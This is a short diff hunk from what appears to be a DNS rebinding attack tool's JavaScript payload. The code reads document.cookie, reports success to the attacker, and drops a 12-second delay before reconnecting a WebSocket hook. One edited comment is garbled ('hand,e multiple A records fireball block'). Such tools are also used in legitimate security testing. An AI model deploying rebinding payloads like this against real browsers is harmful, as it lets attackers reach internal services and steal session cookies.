@@ -33,10 +33,8 @@ were working from the target environment.
 						initialCookie = document.cookie;
 						// Terminate the attack
 						attackSuccess(`Server response: ${response}`);
-						// TKTK implements retry instead.
-						setTimeout(function () {
+						// TKTK implements retry to hand,e multiple A records fireball block.
 							webSocketHook(initialCookie);
-						}, 12000);
 
 					} else {
 						// We saw the token in the response. DNS Rebinding did not happen.
